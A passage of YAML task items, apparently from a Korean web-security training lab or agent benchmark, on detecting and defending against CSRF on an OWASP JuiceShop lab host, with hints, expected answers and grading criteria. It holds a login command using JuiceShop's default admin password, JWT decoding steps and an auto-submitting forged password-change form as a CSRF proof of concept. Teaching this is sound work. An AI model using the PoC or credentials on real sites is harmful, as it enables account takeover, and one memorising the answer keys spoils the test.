      - SAST 로 disable 코드 탐지
      - 코드 레벨 예시
      negative_signs:
      - 단일 프레임워크만
      - 활성화/비활성화 구분 없음
      - 기본값 안전 여부 불명
  target_vm: attacker
  script: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring:
    CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
  risk_level: low
  bastion_prompt: '프레임워크별 CSRF 방어 기능을 비교해줘


    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
    등 적합 도구로 호출 후 stdout quote.'
- order: 13
  instruction: 'CSRF 취약점 자동 탐지 방법을 구현하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_tool` 에 적합한 도구: csrf-poc-generator, curl.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 폼의 토큰 유무를 자동 확인하세요.
  category: csrf_tool
  points: 10
  answer: '🤖 프롬프트: CSRF 취약점 자동 탐지 방법을 구현해줘

    📎 참고 (CLI): echo ''자동 CSRF 탐지: 폼 분석 -> 토큰 검사 -> 결과'' && echo ''자동 탐지 완료'''
  answer_detail: 자동화된 CSRF 토큰 검사로 누락된 방어를 식별합니다.
  verify:
    type: output_contains
    expect: 자동 탐지 완료
    field: stdout
    semantic:
      intent: CSRF 자동 탐지 — ZAP/Burp active scan, csrfprobe 등 도구로 폼·엔드포인트 자동 점검
      success_criteria:
      - 최소 1개 도구 실행 예시 (ZAP 또는 Burp)
      - 탐지 로직(토큰 제거 후 요청 성공 여부) 설명
      - False positive 방지 전략
      acceptable_methods:
      - OWASP ZAP CSRF scan rule
      - Burp Suite Pro active scan
      - csrfprobe 또는 xsrfprobe
      - python 스크립트로 폼 자동 수집 후 토큰 제거 시도
      negative_signs:
      - 수동 탐지만 언급
      - False positive 관점 없음
      - 도구 실행 결과 해석 없음
  target_vm: attacker
  script: 'echo ''자동 CSRF 탐지: 폼 분석 -> 토큰 검사 -> 결과'' && echo ''자동 탐지 완료'''
  risk_level: low
  bastion_prompt: 'CSRF 취약점 자동 탐지 방법을 구현해줘


    [도구 권장] csrf_tool: csrf-poc-generator, curl. curl 만 쓰지 말고 **csrf-poc-generator**
    등 적합 도구로 호출 후 stdout quote.'
- order: 14
  instruction: 'CSRF 방어 권고사항을 종합 정리하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 토큰, SameSite, Referer 검증 등을 포함하세요.
  category: csrf_defense
  points: 12
  answer: '🤖 프롬프트: CSRF 방어 권고사항을 종합 정리해줘

    📎 참고 (CLI): echo ''=== CSRF 방어 권고 ==='' && echo ''1. CSRF 토큰 적용'' && echo ''2.
    SameSite=Strict'' && echo ''3. Referer 검증'' && echo ''4. CORS 제한'' && echo ''CSRF
    방어 정리 완료'''
  answer_detail: 다층 CSRF 방어가 필요합니다.
  verify:
    type: output_contains
    expect: CSRF 방어 정리 완료
    field: stdout
    semantic:
      intent: CSRF 방어 권고 종합 — SameSite Lax/Strict + CSRF 토큰 + Origin/Referer 검증 다층
        방어
      success_criteria:
      - 최소 3개 방어 계층 (쿠키/토큰/Origin) 조합 제안
      - 민감 작업 재인증(step-up auth) 포함
      - 모니터링·이상 탐지 운영적 방어 언급
      acceptable_methods:
      - OWASP CSRF Prevention Cheat Sheet 룰 1-4
      - NIST SP 800-63 재인증 지침
      - CI/CD 스캔 통합
      - WAF CSRF 룰
      negative_signs:
      - 단일 방어만
      - 민감 작업 재인증 누락
      - 모니터링 없음
  target_vm: attacker
  script: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict'
    && echo '3. Referer 검증' && echo '4. CORS 제한' && echo 'CSRF 방어 정리 완료'
  risk_level: low
  bastion_prompt: 'CSRF 방어 권고사항을 종합 정리해줘


    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
    등 적합 도구로 호출 후 stdout quote.'
- order: 15
  instruction: 'CSRF 실습 종합 보고서를 작성하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 발견 취약점, PoC, 방어 권고를 포함하세요.
  category: verification
  points: 8
  answer: '🤖 프롬프트: CSRF 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' &&
    echo ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite''
    && echo ''=== 보고서 완료 ==='''
  answer_detail: CSRF 보고서는 PoC와 재현 절차를 반드시 포함해야 합니다.
  verify:
    type: output_contains
    expect:
    - 보고서 완료
    - Proof
    - Concept
    - report
    field: stdout
    semantic:
      intent: CSRF 실습 종합 보고서 — 탐지·Exploit·방어·자동화 결과를 /tmp/csrf_report.txt 로 정리
      success_criteria:
      - 4 섹션 이상 (폼/토큰/SameSite/CORS 연계)
      - PoC HTML/URL 최소 1개 포함
      - 파일 저장 후 cat 확인
      acceptable_methods:
      - heredoc markdown
      - echo -e 다줄
      - json/yaml 구조화
      - python 템플릿
      negative_signs:
      - 섹션 2 미만
      - PoC 없음
      - 파일 저장 없음
  target_vm: attacker
  script: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' && echo
    ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' &&
    echo ''=== 보고서 완료 ==='''
  risk_level: low
  bastion_prompt: 'CSRF 실습 종합 보고서를 작성하시오.


    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
- order: 99
  instruction: '[복합 시나리오] "인증 방식 × CSRF 방어 매트릭스 — JWT/Session × SameSite/Token/CORS"


    ■ 상황 (w03 → w04 시나리오 연속)


    w03 에서 CSP 미설정 → XSS reflection 까지 봤다. 선배가 다음 단계.


    ※ 선배: "이번 주는 인증·세션이야. JuiceShop 은 JWT 쓰는데, 어떤 사이트는 Cookie+Session 이지.

    ※ 인증 방식이 다르면 CSRF 방어 전략도 달라져. JWT 는 Authorization 헤더라 CSRF 가 자동으론 안 박혀.

    ※ Cookie 면 SameSite/CSRF token 이 필수고. 로그인 한 번 하고 토큰 분석한 다음, CSRF PoC 시도해 보고,

    ※ 인증방식 × 방어수단 매트릭스 만들어. 그게 점검 보고서의 핵심이야."


    학습 목표 (lecture #1 인증 + #3 세션 + #4 JWT) + (lab #1 토큰 + #5 SameSite + #6 토큰 약점)
    통합.


    ■ 임무 (3 단계, 약 35분)


    ▶ Phase A — 로그인 후 인증 토큰 분석 (lecture #1·#4)

    `curl -s -i -X POST -H "Content-Type: application/json"

    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://juice.6v6.lab/rest/user/login`

    실행. 응답에서 `authentication.token` (JWT) 추출. JWT 3-part (header.payload.signature)
    구조 + base64

    payload decode 로 alg / iat / exp 확인.


    ▶ Phase B — CSRF PoC + SameSite 영향 (lab #1·#2·#5)

    JuiceShop 은 JWT Authorization 헤더 방식이므로 *전형적 CSRF 가 안 박힘* — 그 이유 자체가 학습 포인트.

    가상의 Cookie 기반 사이트 가정해, 패스워드 변경 위조 HTML 작성 (`<form action=... method=POST>` +

    `<input name=newpw>` + auto submit script). SameSite=Strict 시 차단 / Lax 시 GET 만
    차단 / None 시

    무방어 — 3 케이스 매트릭스로 구분.


    ▶ Phase C — 인증방식 × CSRF 방어 매트릭스 (lecture·lab 통합)

    | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |

    | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |

    | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |

    | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |

    | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |

    표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.


    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite 매트릭스 ===" / "===
    Phase C 매트릭스 ===".



    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
    답변에 직접 quote** 해야 채점 통과.'
  bastion_prompt: '[복합 시나리오 — w04 인증 × CSRF 매트릭스]


    JuiceShop (http://juice.6v6.lab) 인증 토큰 분석 → CSRF PoC → 매트릭스 보고서 3 phase.


    Phase A (JWT 분석):

    `curl -s -i -X POST -H "Content-Type: application/json" -d ''{"email":"admin@juice-sh.op","password":"admin123"}''

    http://juice.6v6.lab/rest/user/login` 실행. 응답 body 에서 JWT 추출.

    `echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null` 로 payload decode. alg/iat/exp
    출력.


    Phase B (CSRF PoC + SameSite 비교):

    JWT-Header 인증은 CSRF 자동발동 안 됨 (이 자체가 분석 결과). 가상 Cookie 사이트 가정해 패스워드 변경

    위조 HTML PoC 출력 (`<form action="http://victim/change_pw" method=POST><input name=newpw
    value=hacked>

    <script>document.forms[0].submit()</script></form>`).

    SameSite 3 케이스 영향:

    - Strict: 모든 cross-site 요청 차단

    - Lax: GET 허용, POST 차단

    - None: 무방어


    Phase C (매트릭스):

    ```

    | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |

    | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |

    | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |

    | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |

    | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |

    ```

    표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.


    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite 매트릭스 ===" / "===
    Phase C 매트릭스 ===" 묶음.


    반드시 3 phase 모두 실행. 중간 종료 금지.


    [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
    → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
    → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
  hint: 'Phase A: JWT 는 .으로 3분할. payload base64-d 하면 JSON. exp 가 epoch 초.

    Phase B: JuiceShop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 이 사실이 결론. SameSite 3 케이스는
    표만.

    Phase C: 4행 매트릭스. JuiceShop 위치 명시.

    포인트: 인증방식이 다르면 CSRF 위협 모델이 다르다는 점.

    '
  category: integration_scenario
  points: 50
  verify:
    type: output_contains
    expect: 매트릭스
    field: stdout
    semantic:
      intent: 'JuiceShop JWT 토큰 분석 → CSRF PoC + SameSite 영향 → 인증방식 × 방어 매트릭스.

        lecture #1·#3·#4 + lab #1·#5·#6 동시 행동 증명.

        '
      success_criteria:
      - Phase A — JWT 토큰 추출 + payload decode (alg/exp)
      - Phase B — CSRF PoC HTML 작성 + SameSite 3 케이스 비교
      - Phase C — 4행 매트릭스 + JuiceShop 권고
      acceptable_methods:
      - curl POST login + JWT 파싱 (cut + base64)
      - HTML form PoC 텍스트 출력
      - markdown table 매트릭스
      - jwt_tool / jwt-cracker 추가 가능
      negative_signs:
      - JWT decode 누락
      - CSRF PoC 없이 매트릭스만
      - SameSite 3 케이스 누락
      - JuiceShop 의 JWT-Header 특성 분석 누락
  target_vm: attacker
  risk_level: low
  answer: '🤖 위 bastion_prompt 그대로. JWT 추출 → decode → PoC HTML → 매트릭스 echo.

    '
  answer_detail: 'JuiceShop 의 admin 계정 (admin@juice-sh.op / admin123) 으로 로그인해 JWT
    추출. payload decode 시

    alg=HS256, iat·exp 확인. JuiceShop 은 JWT-Header 방식이라 cross-site CSRF 가 자동발동 안 됨
    — 이 사실

    자체가 핵심 학습 결과. SameSite 매트릭스는 가상 Cookie 사이트 기준 비교.

    '
  script: ''
